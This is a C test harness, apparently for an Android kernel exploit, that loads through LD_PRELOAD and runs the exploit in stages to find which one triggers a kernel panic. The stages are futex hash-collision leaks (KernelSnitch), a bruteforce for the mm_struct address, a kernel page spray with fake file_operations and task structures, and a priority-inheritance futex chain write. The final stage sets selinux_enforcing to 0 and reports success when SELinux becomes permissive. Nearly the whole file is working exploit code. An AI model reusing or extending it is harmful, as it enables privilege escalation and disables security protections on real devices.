/*
 * test_minimal.c — 分阶段隔离 panic 触发点
 *
 * 用法: STAGE=N LD_PRELOAD=./test_minimal.so sh -c 'echo done'
 *   STAGE=1 基础初始化
 *   STAGE=2 加 futex 基础操作
 *   STAGE=3 加 kernelsnitch_setup
 *   STAGE=4 加 clone_leak_child (find_collisions, 最可能 panic)
 *   STAGE=5 加 bruteforce
 * 日志: /sdcard/Download/test_minimal.log
 * 若 panic 重启, 日志停在最后成功的阶段
 */
#include "common.h"

/* 重定义 pr_error 不 exit (避免 ashmem open 失败时退出, 需要看 PI 链写入结果) */
#undef pr_error
#define pr_error(fmt, ...) do { \
    printf(COLOR_RED "[-] %s:%d " COLOR_DEFAULT fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
} while (0)

/* run_main_route_threads 在 main.c 定义 (链接 main.c, 不链接 preload.c) */
extern void run_main_route_threads(void);
extern void log_startup_context(void);
extern void init_ashmem_path(void);
extern void setup_kernelsnitch(void);
extern int kernelsnitch_collisions_ready(void);
extern void run_kernelsnitch_bruteforce(void);
extern uintptr_t current_kernelsnitch_mm_struct(void);
extern pid_t clone_leak_child(void);

static void test_log_init(void) {
  int fd = open("/sdcard/Download/test_minimal.log",
                O_WRONLY|O_CREAT|O_TRUNC|O_SYNC|O_CLOEXEC, 0666);
  if (fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    close(fd);
  }
}

static void test_futex_basic(void) {
  uint32_t f1 = 0;
  errno = 0;
  long r = futex_op(&f1, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("FUTEX_LOCK_PI ret=%ld errno=%d\n", r, errno);
  errno = 0;
  r = futex_op(&f1, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("FUTEX_UNLOCK_PI ret=%ld errno=%d\n", r, errno);
}

__attribute__((constructor)) static void test_load(void) {
  static int started;
  if (started) return;
  started = 1;

  test_log_init();
  unsetenv("LD_PRELOAD");

  int max_stage = 1;
  const char *s = getenv("STAGE");
  if (s) max_stage = atoi(s);
  if (max_stage < 1) max_stage = 1;

  pr_info("test_minimal pid=%d STAGE=%d\n", getpid(), max_stage);

  /* STAGE 1: 基础初始化 */
  pr_info("\n===== STAGE 1: basic init =====\n");
  disable_rseq_for_thread();
  set_limit();
  pin_to_core(CORE);
  pr_info("stage 1 done (basic init ok)\n");

  if (max_stage < 2) { pr_info("STOP at stage 1\n"); return; }

  /* STAGE 2: futex 基础操作 */
  pr_info("\n===== STAGE 2: futex basic =====\n");
  test_futex_basic();
  pr_info("stage 2 done (futex basic ok)\n");

  if (max_stage < 3) { pr_info("STOP at stage 2\n"); return; }

  /* STAGE 3: kernelsnitch_setup (只初始化, 不跑碰撞) */
  pr_info("\n===== STAGE 3: kernelsnitch_setup =====\n");
  int cpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
  pr_info("cpu_count=%d\n", cpu);
  setup_kernelsnitch();
  pr_info("stage 3 done (kernelsnitch_setup ok)\n");

  if (max_stage < 4) { pr_info("STOP at stage 3\n"); return; }

  /* STAGE 4: clone_leak_child (跑 find_collisions, 最可能 panic) */
  pr_info("\n===== STAGE 4: clone_leak_child (find_collisions) =====\n");
  pr_info("cloning leak child...\n");
  pid_t child = clone_leak_child();
  pr_info("clone_leak child=%d\n", child);
  if (child > 0) {
    int status = 0;
    pid_t w = waitpid(child, &status, 0);
    pr_info("waitpid ret=%d status=%d exited=%d sig=%d\n",
            w, status, WIFEXITED(status), WTERMSIG(status));
  }
  pr_info("stage 4 done (find_collisions returned without panic)\n");

  if (max_stage < 5) { pr_info("STOP at stage 4\n"); return; }

  /* STAGE 5: bruteforce */
  pr_info("\n===== STAGE 5: bruteforce =====\n");
  int ready = kernelsnitch_collisions_ready();
  pr_info("collisions_ready=%d\n", ready);
  if (ready) {
    pr_info("calling bruteforce...\n");
    run_kernelsnitch_bruteforce();
    uintptr_t mm = current_kernelsnitch_mm_struct();
    pr_info("bruteforce done mm_struct=%016zx\n", mm);
  } else {
    pr_info("collisions not ready, skip bruteforce\n");
  }
  pr_info("stage 5 done\n");

  if (max_stage < 6) { pr_info("STOP at stage 5\n"); return; }

  /* STAGE 6: prepare_good_kernel_page (clone_child + memfd + spray, 可能 panic) */
  pr_info("\n===== STAGE 6: prepare_good_kernel_page =====\n");
  set_pselect_write(0, 0, 0);
  pr_info("calling prepare_good_kernel_page...\n");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  pr_info("prepare_good_kernel_page base=%016zx w0=%016zx task=%016zx fops=%016zx\n",
          page_base, fake_w0, fake_task, fake_fops);
  if (!page_base || !fake_fops || !fake_w0) {
    pr_info("stage 6 FAIL (page prep failed)\n");
    return;
  }
  pr_info("stage 6 done (prepare_good_kernel_page ok)\n");

  if (max_stage < 7) { pr_info("STOP at stage 6\n"); return; }

  /* STAGE 7: PI 链写 selinux_enforcing=0, 验证写入原语 */
  pr_info("\n===== STAGE 7: PI 链写 selinux_enforcing=0 =====\n");
  /* 读写入前的 enforce */
  {
    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    char ebuf[2] = {0};
    if (efd >= 0) { read(efd, ebuf, 1); close(efd); }
    pr_info("enforce BEFORE=%c (1=Enforcing)\n", ebuf[0] ? ebuf[0] : '?');
  }
  /* set_pselect_write(SELINUX_ENFORCING-8, 0, 0) → *(SELINUX_ENFORCING) = 0 */
  set_pselect_write(SELINUX_ENFORCING - 8, 0, 0);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  pr_info("STAGE 7 page_base=%016zx w0=%016zx task=%016zx\n",
          page_base, fake_w0, fake_task);
  if (!page_base || !fake_w0) {
    pr_info("stage 7 FAIL (prepare failed)\n");
    return;
  }
  memset(pselect_user_lock, 0, sizeof(pselect_user_lock));
  pselect_user_lock[0] = 0;
  pselect_user_lock[1] = (uint64_t)fake_w0;
  pselect_user_lock[2] = (uint64_t)fake_w0;
  pselect_user_lock[3] = (uint64_t)fake_task | 1;
  pr_info("calling run_main_route_threads (PI 链写 selinux)...\n");
  run_main_route_threads();
  pr_info("run_main_route_threads returned\n");
  /* 读写入后的 enforce */
  {
    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    char ebuf[2] = {0};
    if (efd >= 0) { read(efd, ebuf, 1); close(efd); }
    pr_info("enforce AFTER=%c (0=Permissive=成功!)\n", ebuf[0] ? ebuf[0] : '?');
    if (ebuf[0] == '0') {
      pr_success("!!! PI 链写入验证成功! selinux=Permissive !!!\n");
    }
  }
  pr_info("stage 7 done\n");

  pr_info("\n===== ALL STAGES PASSED =====\n");
}
